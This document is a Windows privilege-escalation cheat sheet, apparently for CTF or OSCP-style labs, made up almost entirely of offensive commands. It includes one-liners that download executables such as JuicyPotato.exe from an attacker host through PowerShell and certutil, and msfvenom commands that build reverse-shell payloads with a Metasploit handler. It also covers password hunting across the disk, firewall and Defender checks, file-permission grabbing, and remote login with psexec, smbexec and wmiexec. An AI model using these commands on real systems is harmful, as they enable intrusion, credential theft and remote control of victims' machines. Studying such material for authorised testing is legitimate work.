# Downloading Files
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"

certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe

nc

curl

wget

scp
```

# Metasploit Windows Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

```
# Manual Windows Reverse Shell
```
python3 -m http.server

#to get reverse shell from your kali
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 

cd C:\Windows\Temp
certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
```
# Metasploit Windows suggester
```
background

use post/multi/recon/local_exploit_suggester

run SESSION=1
```


# Windows System Enumeration 
```
systeminfo

#32bit ? 64bit ? 68bit ?
wmic os get osarchitecture

systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"

wmic qfe

wmic qfe Caption,Description,HotFixID,InstalledOn

wmic logicaldisk

wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

# Windows User Enumeration 
```
whoami

whoami /priv

whoami /groups

net user

net user jack

net localgroup

net localgroup administrators
```

# Windows Network Enumeration 
```
ipconfig

ipconfig /all

#Check Incoming / Outgoing Network Traffic
arp -a

#Check route table
route print

#Check open ports
netstat -ano
```

# Windows Password Hunting
```
#find 'password' in current directory with extension of txt,ini and config
findstr /si password *.txt *.ini *.config

#find 'password' in whole C: directory
dir /s C:\* | findstr /i "password"
```

# AV Enumeration
```
#Check Window Defender is up or down
sc query windefend

#Check running services
sc queryx type= service

#Check FireWall Status
netsh advfirewall firewall dump
netsh firewall show state 

#Check FireWall configuration
netsh firewall show config
```

# Read Permissions
```
#possible if user is also admin
icacls C:\Users\Administrator\Desktop\root.txt /grant username:F

icacls C:\Windows\System32\net.exe /grant username:username:F

"F" for Full control, "M" for Modify, "R" for Read, "W" for Write, "X" for Execute

```
# Finding exe files
```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

# Login methods
```
 psexec.py administrator:'password'@MACHINE_IP
 
 smbexec.py administrator:'password'@MACHINE_IP
 
 wmiexec.py administrator:'password'@MACHINE_IP
```

# References

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

https://github.com/SecWiki/windows-kernel-exploits

